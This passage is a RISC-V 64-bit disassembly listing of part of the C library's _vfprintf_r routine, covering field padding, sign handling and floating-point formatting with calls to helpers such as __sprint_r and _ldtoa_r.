   10d58:	000ba783          	lw	a5,0(s7)
   10d5c:	0c0107a3          	sb	zero,207(sp)
   10d60:	10f10c23          	sb	a5,280(sp)
   10d64:	4b81                	li	s7,0
   10d66:	4d85                	li	s11,1
   10d68:	4701                	li	a4,0
   10d6a:	e402                	sd	zero,8(sp)
   10d6c:	4c01                	li	s8,0
   10d6e:	4d01                	li	s10,0
   10d70:	0a24                	addi	s1,sp,280
   10d72:	86ba                	mv	a3,a4
   10d74:	01b75363          	ble	s11,a4,10d7a <_vfprintf_r+0x36c>
   10d78:	86ee                	mv	a3,s11
   10d7a:	0cf14603          	lbu	a2,207(sp)
   10d7e:	0006879b          	sext.w	a5,a3
   10d82:	fc3e                	sd	a5,56(sp)
   10d84:	c601                	beqz	a2,10d8c <_vfprintf_r+0x37e>
   10d86:	0016879b          	addiw	a5,a3,1
   10d8a:	fc3e                	sd	a5,56(sp)
   10d8c:	00247693          	andi	a3,s0,2
   10d90:	0006879b          	sext.w	a5,a3
   10d94:	f4be                	sd	a5,104(sp)
   10d96:	c781                	beqz	a5,10d9e <_vfprintf_r+0x390>
   10d98:	57e2                	lw	a5,56(sp)
   10d9a:	2789                	addiw	a5,a5,2
   10d9c:	fc3e                	sd	a5,56(sp)
   10d9e:	08447793          	andi	a5,s0,132
   10da2:	f8be                	sd	a5,112(sp)
   10da4:	efa9                	bnez	a5,10dfe <_vfprintf_r+0x3f0>
   10da6:	5782                	lw	a5,32(sp)
   10da8:	56e2                	lw	a3,56(sp)
   10daa:	40d786bb          	subw	a3,a5,a3
   10dae:	04d05863          	blez	a3,10dfe <_vfprintf_r+0x3f0>
   10db2:	6869                	lui	a6,0x1a
   10db4:	48c1                	li	a7,16
   10db6:	42080813          	addi	a6,a6,1056 # 1a420 <blanks.4440>
   10dba:	4e9d                	li	t4,7
   10dbc:	10812583          	lw	a1,264(sp)
   10dc0:	010cb023          	sd	a6,0(s9)
   10dc4:	6652                	ld	a2,272(sp)
   10dc6:	0015851b          	addiw	a0,a1,1
   10dca:	85aa                	mv	a1,a0
   10dcc:	010c8f13          	addi	t5,s9,16
   10dd0:	1cd8c6e3          	blt	a7,a3,1179c <_vfprintf_r+0xd8e>
   10dd4:	00dcb423          	sd	a3,8(s9)
   10dd8:	96b2                	add	a3,a3,a2
   10dda:	ea36                	sd	a3,272(sp)
   10ddc:	10a12423          	sw	a0,264(sp)
   10de0:	469d                	li	a3,7
   10de2:	8cfa                	mv	s9,t5
   10de4:	00a6dd63          	ble	a0,a3,10dfe <_vfprintf_r+0x3f0>
   10de8:	0210                	addi	a2,sp,256
   10dea:	85ca                	mv	a1,s2
   10dec:	854e                	mv	a0,s3
   10dee:	fcba                	sd	a4,120(sp)
   10df0:	392060ef          	jal	ra,17182 <__sprint_r>
   10df4:	c119                	beqz	a0,10dfa <_vfprintf_r+0x3ec>
   10df6:	17a0106f          	j	11f70 <_vfprintf_r+0x1562>
   10dfa:	7766                	ld	a4,120(sp)
   10dfc:	8cd6                	mv	s9,s5
   10dfe:	0cf14683          	lbu	a3,207(sp)
   10e02:	c2a1                	beqz	a3,10e42 <_vfprintf_r+0x434>
   10e04:	0cf10693          	addi	a3,sp,207
   10e08:	00dcb023          	sd	a3,0(s9)
   10e0c:	4685                	li	a3,1
   10e0e:	00dcb423          	sd	a3,8(s9)
   10e12:	66d2                	ld	a3,272(sp)
   10e14:	0cc1                	addi	s9,s9,16
   10e16:	0685                	addi	a3,a3,1
   10e18:	ea36                	sd	a3,272(sp)
   10e1a:	10812683          	lw	a3,264(sp)
   10e1e:	0016861b          	addiw	a2,a3,1
   10e22:	10c12423          	sw	a2,264(sp)
   10e26:	469d                	li	a3,7
   10e28:	00c6dd63          	ble	a2,a3,10e42 <_vfprintf_r+0x434>
   10e2c:	0210                	addi	a2,sp,256
   10e2e:	85ca                	mv	a1,s2
   10e30:	854e                	mv	a0,s3
   10e32:	fcba                	sd	a4,120(sp)
   10e34:	34e060ef          	jal	ra,17182 <__sprint_r>
   10e38:	c119                	beqz	a0,10e3e <_vfprintf_r+0x430>
   10e3a:	1360106f          	j	11f70 <_vfprintf_r+0x1562>
   10e3e:	7766                	ld	a4,120(sp)
   10e40:	8cd6                	mv	s9,s5
   10e42:	77a6                	ld	a5,104(sp)
   10e44:	cf9d                	beqz	a5,10e82 <_vfprintf_r+0x474>
   10e46:	0994                	addi	a3,sp,208
   10e48:	00dcb023          	sd	a3,0(s9)
   10e4c:	4689                	li	a3,2
   10e4e:	00dcb423          	sd	a3,8(s9)
   10e52:	66d2                	ld	a3,272(sp)
   10e54:	0cc1                	addi	s9,s9,16
   10e56:	0689                	addi	a3,a3,2
   10e58:	ea36                	sd	a3,272(sp)
   10e5a:	10812683          	lw	a3,264(sp)
   10e5e:	0016861b          	addiw	a2,a3,1
   10e62:	10c12423          	sw	a2,264(sp)
   10e66:	469d                	li	a3,7
   10e68:	00c6dd63          	ble	a2,a3,10e82 <_vfprintf_r+0x474>
   10e6c:	0210                	addi	a2,sp,256
   10e6e:	85ca                	mv	a1,s2
   10e70:	854e                	mv	a0,s3
   10e72:	f4ba                	sd	a4,104(sp)
   10e74:	30e060ef          	jal	ra,17182 <__sprint_r>
   10e78:	c119                	beqz	a0,10e7e <_vfprintf_r+0x470>
   10e7a:	0f60106f          	j	11f70 <_vfprintf_r+0x1562>
   10e7e:	7726                	ld	a4,104(sp)
   10e80:	8cd6                	mv	s9,s5
   10e82:	77c6                	ld	a5,112(sp)
   10e84:	08000693          	li	a3,128
   10e88:	04d79e63          	bne	a5,a3,10ee4 <_vfprintf_r+0x4d6>
   10e8c:	5782                	lw	a5,32(sp)
   10e8e:	56e2                	lw	a3,56(sp)
   10e90:	40d786bb          	subw	a3,a5,a3
   10e94:	04d05863          	blez	a3,10ee4 <_vfprintf_r+0x4d6>
   10e98:	6869                	lui	a6,0x1a
   10e9a:	48c1                	li	a7,16
   10e9c:	43080813          	addi	a6,a6,1072 # 1a430 <zeroes.4441>
   10ea0:	4e9d                	li	t4,7
   10ea2:	10812583          	lw	a1,264(sp)
   10ea6:	010cb023          	sd	a6,0(s9)
   10eaa:	6652                	ld	a2,272(sp)
   10eac:	0015851b          	addiw	a0,a1,1
   10eb0:	85aa                	mv	a1,a0
   10eb2:	010c8f13          	addi	t5,s9,16
   10eb6:	12d8c1e3          	blt	a7,a3,117d8 <_vfprintf_r+0xdca>
   10eba:	00dcb423          	sd	a3,8(s9)
   10ebe:	96b2                	add	a3,a3,a2
   10ec0:	ea36                	sd	a3,272(sp)
   10ec2:	10a12423          	sw	a0,264(sp)
   10ec6:	469d                	li	a3,7
   10ec8:	8cfa                	mv	s9,t5
   10eca:	00a6dd63          	ble	a0,a3,10ee4 <_vfprintf_r+0x4d6>
   10ece:	0210                	addi	a2,sp,256
   10ed0:	85ca                	mv	a1,s2
   10ed2:	854e                	mv	a0,s3
   10ed4:	f4ba                	sd	a4,104(sp)
   10ed6:	2ac060ef          	jal	ra,17182 <__sprint_r>
   10eda:	c119                	beqz	a0,10ee0 <_vfprintf_r+0x4d2>
   10edc:	0940106f          	j	11f70 <_vfprintf_r+0x1562>
   10ee0:	7726                	ld	a4,104(sp)
   10ee2:	8cd6                	mv	s9,s5
   10ee4:	41b7073b          	subw	a4,a4,s11
   10ee8:	04e05663          	blez	a4,10f34 <_vfprintf_r+0x526>
   10eec:	6869                	lui	a6,0x1a
   10eee:	48c1                	li	a7,16
   10ef0:	43080813          	addi	a6,a6,1072 # 1a430 <zeroes.4441>
   10ef4:	4e9d                	li	t4,7
   10ef6:	10812603          	lw	a2,264(sp)
   10efa:	010cb023          	sd	a6,0(s9)
   10efe:	66d2                	ld	a3,272(sp)
   10f00:	0016059b          	addiw	a1,a2,1
   10f04:	862e                	mv	a2,a1
   10f06:	010c8513          	addi	a0,s9,16
   10f0a:	10e8c5e3          	blt	a7,a4,11814 <_vfprintf_r+0xe06>
   10f0e:	00ecb423          	sd	a4,8(s9)
   10f12:	9736                	add	a4,a4,a3
   10f14:	ea3a                	sd	a4,272(sp)
   10f16:	10b12423          	sw	a1,264(sp)
   10f1a:	471d                	li	a4,7
   10f1c:	8caa                	mv	s9,a0
   10f1e:	00b75b63          	ble	a1,a4,10f34 <_vfprintf_r+0x526>
   10f22:	0210                	addi	a2,sp,256
   10f24:	85ca                	mv	a1,s2
   10f26:	854e                	mv	a0,s3
   10f28:	25a060ef          	jal	ra,17182 <__sprint_r>
   10f2c:	c119                	beqz	a0,10f32 <_vfprintf_r+0x524>
   10f2e:	0420106f          	j	11f70 <_vfprintf_r+0x1562>
   10f32:	8cd6                	mv	s9,s5
   10f34:	10047693          	andi	a3,s0,256
   10f38:	6752                	ld	a4,272(sp)
   10f3a:	100699e3          	bnez	a3,1184c <_vfprintf_r+0xe3e>
   10f3e:	10812783          	lw	a5,264(sp)
   10f42:	00ed8e33          	add	t3,s11,a4
   10f46:	009cb023          	sd	s1,0(s9)
   10f4a:	0017871b          	addiw	a4,a5,1
   10f4e:	01bcb423          	sd	s11,8(s9)
   10f52:	ea72                	sd	t3,272(sp)
   10f54:	10e12423          	sw	a4,264(sp)
   10f58:	479d                	li	a5,7
   10f5a:	0cc1                	addi	s9,s9,16
   10f5c:	1ce7d4e3          	ble	a4,a5,11924 <_vfprintf_r+0xf16>
   10f60:	0210                	addi	a2,sp,256
   10f62:	85ca                	mv	a1,s2
   10f64:	854e                	mv	a0,s3
   10f66:	21c060ef          	jal	ra,17182 <__sprint_r>
   10f6a:	c119                	beqz	a0,10f70 <_vfprintf_r+0x562>
   10f6c:	0040106f          	j	11f70 <_vfprintf_r+0x1562>
   10f70:	8cd6                	mv	s9,s5
   10f72:	1b30006f          	j	11924 <_vfprintf_r+0xf16>
   10f76:	01046413          	ori	s0,s0,16
   10f7a:	2401                	sext.w	s0,s0
   10f7c:	008b8793          	addi	a5,s7,8
   10f80:	f83e                	sd	a5,48(sp)
   10f82:	02047793          	andi	a5,s0,32
   10f86:	cb85                	beqz	a5,10fb6 <_vfprintf_r+0x5a8>
   10f88:	000bbb83          	ld	s7,0(s7)
   10f8c:	000bd863          	bgez	s7,10f9c <_vfprintf_r+0x58e>
   10f90:	02d00793          	li	a5,45
   10f94:	41700bb3          	neg	s7,s7
   10f98:	0cf107a3          	sb	a5,207(sp)
   10f9c:	57fd                	li	a5,-1
   10f9e:	6efd9963          	bne	s11,a5,11690 <_vfprintf_r+0xc82>
   10fa2:	47a5                	li	a5,9
   10fa4:	7577e463          	bltu	a5,s7,116ec <_vfprintf_r+0xcde>
   10fa8:	030b8b9b          	addiw	s7,s7,48
   10fac:	17710da3          	sb	s7,379(sp)
   10fb0:	17b10493          	addi	s1,sp,379
   10fb4:	af39                	j	116d2 <_vfprintf_r+0xcc4>
   10fb6:	01047793          	andi	a5,s0,16
   10fba:	f7f9                	bnez	a5,10f88 <_vfprintf_r+0x57a>
   10fbc:	04047793          	andi	a5,s0,64
   10fc0:	c781                	beqz	a5,10fc8 <_vfprintf_r+0x5ba>
   10fc2:	000b9b83          	lh	s7,0(s7)
   10fc6:	b7d9                	j	10f8c <_vfprintf_r+0x57e>
   10fc8:	20047793          	andi	a5,s0,512
   10fcc:	c781                	beqz	a5,10fd4 <_vfprintf_r+0x5c6>
   10fce:	000b8b83          	lb	s7,0(s7)
   10fd2:	bf6d                	j	10f8c <_vfprintf_r+0x57e>
   10fd4:	000bab83          	lw	s7,0(s7)
   10fd8:	bf55                	j	10f8c <_vfprintf_r+0x57e>
   10fda:	00847793          	andi	a5,s0,8
   10fde:	cfb9                	beqz	a5,1103c <_vfprintf_r+0x62e>
   10fe0:	0bbd                	addi	s7,s7,15
   10fe2:	ff0bfb93          	andi	s7,s7,-16
   10fe6:	010b8793          	addi	a5,s7,16
   10fea:	f83e                	sd	a5,48(sp)
   10fec:	000bb783          	ld	a5,0(s7)
   10ff0:	f9be                	sd	a5,240(sp)
   10ff2:	008bb783          	ld	a5,8(s7)
   10ff6:	fdbe                	sd	a5,248(sp)
   10ff8:	1988                	addi	a0,sp,240
   10ffa:	2d8030ef          	jal	ra,142d2 <_ldcheck>
   10ffe:	cdaa                	sw	a0,216(sp)
   11000:	4789                	li	a5,2
   11002:	04f51c63          	bne	a0,a5,1105a <_vfprintf_r+0x64c>
   11006:	754e                	ld	a0,240(sp)
   11008:	75ee                	ld	a1,248(sp)
   1100a:	4601                	li	a2,0
   1100c:	4681                	li	a3,0
   1100e:	583070ef          	jal	ra,18d90 <__letf2>
   11012:	00055663          	bgez	a0,1101e <_vfprintf_r+0x610>
   11016:	02d00793          	li	a5,45
   1101a:	0cf107a3          	sb	a5,207(sp)
   1101e:	04700793          	li	a5,71
   11022:	0367c763          	blt	a5,s6,11050 <_vfprintf_r+0x642>
   11026:	0001a4b7          	lui	s1,0x1a
   1102a:	47048493          	addi	s1,s1,1136 # 1a470 <zeroes.4441+0x40>
   1102e:	f7f47413          	andi	s0,s0,-129
   11032:	2401                	sext.w	s0,s0
   11034:	4b81                	li	s7,0
   11036:	4d8d                	li	s11,3
   11038:	4701                	li	a4,0
   1103a:	a555                	j	116de <_vfprintf_r+0xcd0>
   1103c:	000bb507          	fld	fa0,0(s7)
   11040:	008b8793          	addi	a5,s7,8
   11044:	f83e                	sd	a5,48(sp)
   11046:	575080ef          	jal	ra,19dba <__extenddftf2>
   1104a:	f9aa                	sd	a0,240(sp)
   1104c:	fdae                	sd	a1,248(sp)
   1104e:	b76d                	j	10ff8 <_vfprintf_r+0x5ea>
   11050:	0001a4b7          	lui	s1,0x1a
   11054:	47848493          	addi	s1,s1,1144 # 1a478 <zeroes.4441+0x48>
   11058:	bfd9                	j	1102e <_vfprintf_r+0x620>
   1105a:	4785                	li	a5,1
   1105c:	02f51763          	bne	a0,a5,1108a <_vfprintf_r+0x67c>
   11060:	77ee                	ld	a5,248(sp)
   11062:	0007d663          	bgez	a5,1106e <_vfprintf_r+0x660>
   11066:	02d00793          	li	a5,45
   1106a:	0cf107a3          	sb	a5,207(sp)
   1106e:	04700793          	li	a5,71
   11072:	0167c763          	blt	a5,s6,11080 <_vfprintf_r+0x672>
   11076:	0001a4b7          	lui	s1,0x1a
   1107a:	48048493          	addi	s1,s1,1152 # 1a480 <zeroes.4441+0x50>
   1107e:	bf45                	j	1102e <_vfprintf_r+0x620>
   11080:	0001a4b7          	lui	s1,0x1a
   11084:	48848493          	addi	s1,s1,1160 # 1a488 <zeroes.4441+0x58>
   11088:	b75d                	j	1102e <_vfprintf_r+0x620>
   1108a:	fdfb7c13          	andi	s8,s6,-33
   1108e:	04100793          	li	a5,65
   11092:	04fc1c63          	bne	s8,a5,110ea <_vfprintf_r+0x6dc>
   11096:	03000793          	li	a5,48
   1109a:	0cf10823          	sb	a5,208(sp)
   1109e:	06100713          	li	a4,97
   110a2:	05800793          	li	a5,88
   110a6:	00eb1463          	bne	s6,a4,110ae <_vfprintf_r+0x6a0>
   110aa:	07800793          	li	a5,120
   110ae:	0cf108a3          	sb	a5,209(sp)
   110b2:	00246413          	ori	s0,s0,2
   110b6:	06300793          	li	a5,99
   110ba:	2401                	sext.w	s0,s0
   110bc:	15b7db63          	ble	s11,a5,11212 <_vfprintf_r+0x804>
   110c0:	001d859b          	addiw	a1,s11,1
   110c4:	854e                	mv	a0,s3
   110c6:	3fc030ef          	jal	ra,144c2 <_malloc_r>
   110ca:	84aa                	mv	s1,a0
   110cc:	14051663          	bnez	a0,11218 <_vfprintf_r+0x80a>
   110d0:	01095783          	lhu	a5,16(s2)
   110d4:	0407e793          	ori	a5,a5,64
   110d8:	00f91823          	sh	a5,16(s2)
   110dc:	01095783          	lhu	a5,16(s2)
   110e0:	0407f793          	andi	a5,a5,64
   110e4:	9e0780e3          	beqz	a5,10ac4 <_vfprintf_r+0xb6>
   110e8:	b40d                	j	10b0a <_vfprintf_r+0xfc>
   110ea:	57fd                	li	a5,-1
   110ec:	12fd8863          	beq	s11,a5,1121c <_vfprintf_r+0x80e>
   110f0:	04700793          	li	a5,71
   110f4:	4b81                	li	s7,0
   110f6:	00fc1463          	bne	s8,a5,110fe <_vfprintf_r+0x6f0>
   110fa:	120d8463          	beqz	s11,11222 <_vfprintf_r+0x814>
   110fe:	10046793          	ori	a5,s0,256
   11102:	7a6e                	ld	s4,248(sp)
   11104:	2781                	sext.w	a5,a5
   11106:	fc3e                	sd	a5,56(sp)
   11108:	fc82                	sd	zero,120(sp)
   1110a:	7ece                	ld	t4,240(sp)
   1110c:	000a5963          	bgez	s4,1111e <_vfprintf_r+0x710>
   11110:	57fd                	li	a5,-1
   11112:	17fe                	slli	a5,a5,0x3f
   11114:	00fa4a33          	xor	s4,s4,a5
   11118:	02d00793          	li	a5,45
   1111c:	fcbe                	sd	a5,120(sp)
   1111e:	04100793          	li	a5,65
   11122:	22fc1363          	bne	s8,a5,11348 <_vfprintf_r+0x93a>
   11126:	8576                	mv	a0,t4
   11128:	85d2                	mv	a1,s4
   1112a:	575080ef          	jal	ra,19e9e <__trunctfdf2>
   1112e:	09a8                	addi	a0,sp,216
   11130:	7ec040ef          	jal	ra,1591c <frexp>
   11134:	487080ef          	jal	ra,19dba <__extenddftf2>
   11138:	768a                	ld	a3,160(sp)
   1113a:	4601                	li	a2,0
   1113c:	519070ef          	jal	ra,18e54 <__multf3>
   11140:	4601                	li	a2,0
   11142:	4681                	li	a3,0
   11144:	e12a                	sd	a0,128(sp)
   11146:	e52e                	sd	a1,136(sp)
   11148:	2e1070ef          	jal	ra,18c28 <__eqtf2>
   1114c:	e119                	bnez	a0,11152 <_vfprintf_r+0x744>
   1114e:	4785                	li	a5,1
   11150:	cdbe                	sw	a5,216(sp)
   11152:	06100793          	li	a5,97
   11156:	0cfb1963          	bne	s6,a5,11228 <_vfprintf_r+0x81a>
   1115a:	0001a7b7          	lui	a5,0x1a
   1115e:	49078793          	addi	a5,a5,1168 # 1a490 <zeroes.4441+0x60>
   11162:	e43e                	sd	a5,8(sp)
   11164:	fffd871b          	addiw	a4,s11,-1
   11168:	8a26                	mv	s4,s1
   1116a:	76aa                	ld	a3,168(sp)
   1116c:	650a                	ld	a0,128(sp)
   1116e:	65aa                	ld	a1,136(sp)
   11170:	4601                	li	a2,0
   11172:	f93a                	sd	a4,176(sp)
   11174:	4e1070ef          	jal	ra,18e54 <__multf3>
   11178:	8d2a                	mv	s10,a0
   1117a:	f4ae                	sd	a1,104(sp)
   1117c:	32f080ef          	jal	ra,19caa <__fixtfsi>
   11180:	0005079b          	sext.w	a5,a0
   11184:	f8be                	sd	a5,112(sp)
   11186:	3b7080ef          	jal	ra,19d3c <__floatsitf>
   1118a:	77a6                	ld	a5,104(sp)
   1118c:	86ae                	mv	a3,a1
   1118e:	862a                	mv	a2,a0
   11190:	85be                	mv	a1,a5
   11192:	856a                	mv	a0,s10
   11194:	306080ef          	jal	ra,1949a <__subtf3>
   11198:	67a2                	ld	a5,8(sp)
   1119a:	7746                	ld	a4,112(sp)
   1119c:	0a05                	addi	s4,s4,1
   1119e:	e12a                	sd	a0,128(sp)
   111a0:	00e786b3          	add	a3,a5,a4
   111a4:	774a                	ld	a4,176(sp)
   111a6:	0006c683          	lbu	a3,0(a3) # 2000 <_start-0xe0b0>
   111aa:	e52e                	sd	a1,136(sp)
   111ac:	0007079b          	sext.w	a5,a4
   111b0:	f4be                	sd	a5,104(sp)
   111b2:	feda0fa3          	sb	a3,-1(s4)
   111b6:	57fd                	li	a5,-1
   111b8:	88aa                	mv	a7,a0
   111ba:	8d2e                	mv	s10,a1
   111bc:	06f70b63          	beq	a4,a5,11232 <_vfprintf_r+0x824>
   111c0:	377d                	addiw	a4,a4,-1
   111c2:	4601                	li	a2,0
   111c4:	4681                	li	a3,0
   111c6:	f93a                	sd	a4,176(sp)
   111c8:	fd2a                	sd	a0,184(sp)
   111ca:	25f070ef          	jal	ra,18c28 <__eqtf2>
   111ce:	774a                	ld	a4,176(sp)
   111d0:	78ea                	ld	a7,184(sp)
   111d2:	fd41                	bnez	a0,1116a <_vfprintf_r+0x75c>
   111d4:	66ca                	ld	a3,144(sp)
   111d6:	4601                	li	a2,0
   111d8:	8546                	mv	a0,a7
   111da:	85ea                	mv	a1,s10
   111dc:	e146                	sd	a7,128(sp)
   111de:	2ef070ef          	jal	ra,18ccc <__getf2>
   111e2:	04a04b63          	bgtz	a0,11238 <_vfprintf_r+0x82a>
   111e6:	688a                	ld	a7,128(sp)
   111e8:	66ca                	ld	a3,144(sp)
   111ea:	4601                	li	a2,0
   111ec:	8546                	mv	a0,a7
   111ee:	85ea                	mv	a1,s10
   111f0:	239070ef          	jal	ra,18c28 <__eqtf2>
   111f4:	e509                	bnez	a0,111fe <_vfprintf_r+0x7f0>
   111f6:	77c6                	ld	a5,112(sp)
   111f8:	0017f713          	andi	a4,a5,1
   111fc:	ef15                	bnez	a4,11238 <_vfprintf_r+0x82a>
   111fe:	5726                	lw	a4,104(sp)
   11200:	03000693          	li	a3,48
   11204:	06074163          	bltz	a4,11266 <_vfprintf_r+0x858>
   11208:	0a05                	addi	s4,s4,1
   1120a:	feda0fa3          	sb	a3,-1(s4)
   1120e:	377d                	addiw	a4,a4,-1
   11210:	bfd5                	j	11204 <_vfprintf_r+0x7f6>
   11212:	4b81                	li	s7,0
   11214:	0a24                	addi	s1,sp,280
   11216:	b5e5                	j	110fe <_vfprintf_r+0x6f0>
   11218:	8baa                	mv	s7,a0
   1121a:	b5d5                	j	110fe <_vfprintf_r+0x6f0>
   1121c:	4b81                	li	s7,0
   1121e:	4d99                	li	s11,6
   11220:	bdf9                	j	110fe <_vfprintf_r+0x6f0>
   11222:	8bee                	mv	s7,s11
   11224:	4d85                	li	s11,1
   11226:	bde1                	j	110fe <_vfprintf_r+0x6f0>
   11228:	0001a7b7          	lui	a5,0x1a
   1122c:	4a878793          	addi	a5,a5,1192 # 1a4a8 <zeroes.4441+0x78>
   11230:	bf0d                	j	11162 <_vfprintf_r+0x754>
   11232:	57fd                	li	a5,-1
   11234:	f4be                	sd	a5,104(sp)
   11236:	bf79                	j	111d4 <_vfprintf_r+0x7c6>
   11238:	67a2                	ld	a5,8(sp)
   1123a:	f5d2                	sd	s4,232(sp)
   1123c:	03000593          	li	a1,48
   11240:	00f7c603          	lbu	a2,15(a5)
   11244:	76ae                	ld	a3,232(sp)
   11246:	fff68713          	addi	a4,a3,-1
   1124a:	f5ba                	sd	a4,232(sp)
   1124c:	fff6c703          	lbu	a4,-1(a3)
   11250:	0ec70563          	beq	a4,a2,1133a <_vfprintf_r+0x92c>
   11254:	03900613          	li	a2,57
   11258:	0ec71463          	bne	a4,a2,11340 <_vfprintf_r+0x932>
   1125c:	67a2                	ld	a5,8(sp)
   1125e:	00a7c703          	lbu	a4,10(a5)
   11262:	fee68fa3          	sb	a4,-1(a3)
   11266:	04700713          	li	a4,71
   1126a:	409a0a3b          	subw	s4,s4,s1
   1126e:	4d6e                	lw	s10,216(sp)
   11270:	18ec1463          	bne	s8,a4,113f8 <_vfprintf_r+0x9ea>
   11274:	5775                	li	a4,-3
   11276:	00ed4463          	blt	s10,a4,1127e <_vfprintf_r+0x870>
   1127a:	1fadd463          	ble	s10,s11,11462 <_vfprintf_r+0xa54>
   1127e:	3b79                	addiw	s6,s6,-2
   11280:	fffd069b          	addiw	a3,s10,-1
   11284:	cdb6                	sw	a3,216(sp)
   11286:	fdfb7613          	andi	a2,s6,-33
   1128a:	04100513          	li	a0,65
   1128e:	0ffb7713          	andi	a4,s6,255
   11292:	4581                	li	a1,0
   11294:	00a61663          	bne	a2,a0,112a0 <_vfprintf_r+0x892>
   11298:	273d                	addiw	a4,a4,15
   1129a:	0ff77713          	andi	a4,a4,255
   1129e:	4585                	li	a1,1
   112a0:	0ee10023          	sb	a4,224(sp)
   112a4:	02b00793          	li	a5,43
   112a8:	0006d763          	bgez	a3,112b6 <_vfprintf_r+0x8a8>
   112ac:	4685                	li	a3,1
   112ae:	41a686bb          	subw	a3,a3,s10
   112b2:	02d00793          	li	a5,45
   112b6:	0ef100a3          	sb	a5,225(sp)
   112ba:	47a5                	li	a5,9
   112bc:	16d7da63          	ble	a3,a5,11430 <_vfprintf_r+0xa22>
   112c0:	0ef10713          	addi	a4,sp,239
   112c4:	853a                	mv	a0,a4
   112c6:	45a9                	li	a1,10
   112c8:	4825                	li	a6,9
   112ca:	02b6e7bb          	remw	a5,a3,a1
   112ce:	fff70613          	addi	a2,a4,-1
   112d2:	02b6c6bb          	divw	a3,a3,a1
   112d6:	0307879b          	addiw	a5,a5,48
   112da:	fef70fa3          	sb	a5,-1(a4)
   112de:	14d84063          	blt	a6,a3,1141e <_vfprintf_r+0xa10>
   112e2:	0306879b          	addiw	a5,a3,48
   112e6:	fef60fa3          	sb	a5,-1(a2)
   112ea:	1779                	addi	a4,a4,-2
   112ec:	0e210613          	addi	a2,sp,226
   112f0:	12a76963          	bltu	a4,a0,11422 <_vfprintf_r+0xa14>
   112f4:	119c                	addi	a5,sp,224
   112f6:	40f607bb          	subw	a5,a2,a5
   112fa:	ecbe                	sd	a5,88(sp)
   112fc:	47e6                	lw	a5,88(sp)
   112fe:	4705                	li	a4,1
   11300:	01478dbb          	addw	s11,a5,s4
   11304:	87ee                	mv	a5,s11
   11306:	01474563          	blt	a4,s4,11310 <_vfprintf_r+0x902>
   1130a:	00147713          	andi	a4,s0,1
   1130e:	c701                	beqz	a4,11316 <_vfprintf_r+0x908>
   11310:	4762                	lw	a4,24(sp)
   11312:	00e78dbb          	addw	s11,a5,a4
   11316:	bff47413          	andi	s0,s0,-1025
   1131a:	2401                	sext.w	s0,s0
   1131c:	10046793          	ori	a5,s0,256
   11320:	fc3e                	sd	a5,56(sp)
   11322:	e402                	sd	zero,8(sp)
   11324:	4c01                	li	s8,0
   11326:	4d01                	li	s10,0
   11328:	77e6                	ld	a5,120(sp)
   1132a:	c789                	beqz	a5,11334 <_vfprintf_r+0x926>
   1132c:	02d00713          	li	a4,45
   11330:	0ce107a3          	sb	a4,207(sp)
   11334:	7462                	ld	s0,56(sp)
   11336:	4701                	li	a4,0
   11338:	bc2d                	j	10d72 <_vfprintf_r+0x364>
   1133a:	feb68fa3          	sb	a1,-1(a3)
   1133e:	b719                	j	11244 <_vfprintf_r+0x836>
   11340:	2705                	addiw	a4,a4,1
   11342:	0ff77713          	andi	a4,a4,255
   11346:	bf31                	j	11262 <_vfprintf_r+0x854>
   11348:	04600793          	li	a5,70
   1134c:	00fc0b63          	beq	s8,a5,11362 <_vfprintf_r+0x954>
   11350:	04500793          	li	a5,69
   11354:	8d6e                	mv	s10,s11
   11356:	00fc1463          	bne	s8,a5,1135e <_vfprintf_r+0x950>
   1135a:	001d8d1b          	addiw	s10,s11,1
   1135e:	4689                	li	a3,2
   11360:	a019                	j	11366 <_vfprintf_r+0x958>
   11362:	8d6e                	mv	s10,s11
   11364:	468d                	li	a3,3
   11366:	09bc                	addi	a5,sp,216
   11368:	85f6                	mv	a1,t4
   1136a:	0e810893          	addi	a7,sp,232
   1136e:	0dc10813          	addi	a6,sp,220
   11372:	876a                	mv	a4,s10
   11374:	8652                	mv	a2,s4
   11376:	854e                	mv	a0,s3
   11378:	e476                	sd	t4,8(sp)
   1137a:	642020ef          	jal	ra,139bc <_ldtoa_r>
   1137e:	04700793          	li	a5,71
   11382:	84aa                	mv	s1,a0
   11384:	6ea2                	ld	t4,8(sp)
   11386:	00fc1563          	bne	s8,a5,11390 <_vfprintf_r+0x982>
   1138a:	00147793          	andi	a5,s0,1
   1138e:	cbb1                	beqz	a5,113e2 <_vfprintf_r+0x9d4>
   11390:	04600713          	li	a4,70
   11394:	01a487b3          	add	a5,s1,s10
   11398:	02ec1963          	bne	s8,a4,113ca <_vfprintf_r+0x9bc>
   1139c:	0004c683          	lbu	a3,0(s1)
   113a0:	03000713          	li	a4,48
   113a4:	02e69163          	bne	a3,a4,113c6 <_vfprintf_r+0x9b8>
   113a8:	8576                	mv	a0,t4
   113aa:	4601                	li	a2,0
   113ac:	4681                	li	a3,0
   113ae:	85d2                	mv	a1,s4
   113b0:	f4be                	sd	a5,104(sp)
   113b2:	e476                	sd	t4,8(sp)
   113b4:	075070ef          	jal	ra,18c28 <__eqtf2>
   113b8:	6ea2                	ld	t4,8(sp)
   113ba:	77a6                	ld	a5,104(sp)
   113bc:	c509                	beqz	a0,113c6 <_vfprintf_r+0x9b8>
   113be:	4705                	li	a4,1
   113c0:	41a70d3b          	subw	s10,a4,s10
   113c4:	cdea                	sw	s10,216(sp)
   113c6:	476e                	lw	a4,216(sp)
   113c8:	97ba                	add	a5,a5,a4
   113ca:	4681                	li	a3,0
   113cc:	4601                	li	a2,0
   113ce:	8576                	mv	a0,t4
   113d0:	85d2                	mv	a1,s4
   113d2:	e43e                	sd	a5,8(sp)
   113d4:	055070ef          	jal	ra,18c28 <__eqtf2>
   113d8:	67a2                	ld	a5,8(sp)
   113da:	03000693          	li	a3,48
   113de:	e909                	bnez	a0,113f0 <_vfprintf_r+0x9e2>
   113e0:	f5be                	sd	a5,232(sp)
   113e2:	7a2e                	ld	s4,232(sp)
   113e4:	b549                	j	11266 <_vfprintf_r+0x858>
   113e6:	00170613          	addi	a2,a4,1
   113ea:	f5b2                	sd	a2,232(sp)
   113ec:	00d70023          	sb	a3,0(a4)
   113f0:	772e                	ld	a4,232(sp)
   113f2:	fef76ae3          	bltu	a4,a5,113e6 <_vfprintf_r+0x9d8>
   113f6:	b7f5                	j	113e2 <_vfprintf_r+0x9d4>
   113f8:	04600713          	li	a4,70
   113fc:	e8ec12e3          	bne	s8,a4,11280 <_vfprintf_r+0x872>
   11400:	05a05863          	blez	s10,11450 <_vfprintf_r+0xa42>
   11404:	000d9563          	bnez	s11,1140e <_vfprintf_r+0xa00>
